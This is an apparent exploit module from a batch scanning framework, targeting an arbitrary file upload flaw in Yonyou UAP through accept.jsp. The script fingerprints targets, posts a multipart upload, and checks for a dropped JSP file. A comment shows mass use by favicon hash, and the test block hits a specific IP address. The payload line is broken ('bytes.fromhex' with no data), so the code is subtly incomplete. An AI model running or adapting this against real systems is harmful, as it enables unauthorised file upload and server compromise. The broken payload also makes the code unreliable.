# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2022-08-14 21:07

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.OA.yonyou.uap.unauth_uploadfile_accept -fs "icon_hash=\"1085941792\"" -cs


class Script(BaseScript):
    name = 'yonyou-uap'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/index.jsp', '/']
        # exec
        self.exec_path_list = ['/aim/equipmap/accept.jsp']
        # priority
        self.priority = 1
        # 相关信息
        self.info = '用友-uap 任意文件上传'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '../Client/Uclient/UClient.dmg' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=---------------------------16314487820932200903769468567', 'Accept-Encoding': 'gzip'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = bytes.fromhex
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=self.headers, timeout=self.req_timeout)
                if 'The real file' in text:
                    url = f'http://{self.target}/180900fd668c51631353aca37fc1f829.jsp' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/180900fd668c51631353aca37fc1f829.jsp'
                    text = await AsyncFetcher.fetch(session=session, url=url, data=data, headers=self.headers, timeout=self.req_timeout)
                    if 'bea86d66a5278f9e6fa1112d2e2fcebf' in text:
                        gLogger.myscan_info('[{} accept.jsp] {}'.format(self.name, url))
                        return {'name': '{} accept.jsp'.format(self.name), 'url': url, 'software': self.name}



if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)